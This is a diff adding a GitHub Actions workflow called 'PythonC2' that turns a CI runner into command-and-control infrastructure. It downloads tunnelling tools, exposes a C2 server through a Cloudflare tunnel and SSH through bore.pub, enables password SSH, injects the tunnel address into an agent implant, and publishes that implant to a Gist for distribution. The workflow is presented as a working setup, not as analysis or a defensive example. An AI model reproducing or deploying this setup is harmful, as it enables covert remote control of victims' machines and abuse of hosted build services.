@@ -1,0 +1,65 @@
+name: PythonC2
+on: workflow_dispatch
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Start bore tunnel for SSH
+        run: |
+          curl -L https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz | tar xz
+          ./bore local 22 --to bore.pub 2>&1 | tee /tmp/bore-ssh.log &
+          for i in $(seq 1 10); do
+            SSH_PORT=$(grep -o 'bore.pub:[0-9]*' /tmp/bore-ssh.log | cut -d: -f2)
+            if [ -n "$SSH_PORT" ]; then break; fi
+            sleep 1
+          done
+          echo "SSH_PORT=$SSH_PORT" >> $GITHUB_ENV
+          echo "::notice::SSH: ssh runner@bore.pub -p $SSH_PORT"
+
+      - name: Start Cloudflare tunnel for C2
+        run: |
+          curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
+          chmod +x cloudflared
+          ./cloudflared tunnel --url http://localhost:8080 --no-autoupdate 2>&1 | tee /tmp/cf.log &
+          for i in $(seq 1 20); do
+            CF_URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/cf.log | head -1)
+            if [ -n "$CF_URL" ]; then break; fi
+            sleep 2
+          done
+          CF_HOST=$(echo $CF_URL | sed 's|https://||')
+          echo "CF_HOST=$CF_HOST" >> $GITHUB_ENV
+          echo "::notice::C2 Host: https://$CF_HOST"
+
+      - name: Setup SSH
+        run: |
+          echo "alias c2='python3 ${{ github.workspace }}/C2server.py'" >> /home/runner/.bash_profile
+          echo "runner:${{ secrets.SSH_PASSWORD }}" | sudo chpasswd
+          sudo mkdir -p /etc/ssh/sshd_config.d
+          echo "PasswordAuthentication yes" | sudo tee /etc/ssh/sshd_config.d/99-password.conf
+          sudo systemctl stop ssh.socket || true
+          sudo systemctl disable ssh.socket || true
+          sudo systemctl enable ssh
+          sudo systemctl restart ssh
+
+      - name: Install C2 server deps
+        run: pip install flask prompt_toolkit -q
+
+      - name: Inject CF host into agent
+        run: |
+          sed "s|CF_HOST_PLACEHOLDER|${{ env.CF_HOST }}|g" agent.py > ${{ github.workspace }}/agent_out.py
+          echo "Agent configured for: https://${{ env.CF_HOST }}"
+
+      - name: Push agent to Gist
+        uses: exuanbo/actions-deploy-gist@v1
+        with:
+          token: ${{ secrets.GIST_TOKEN }}
+          gist_id: 75656599c2c09ae88aa6c82459a9ea4a
+          file_path: agent_out.py
+          file_type: text
+
+      - name: Keep alive
+        run: sleep 21600
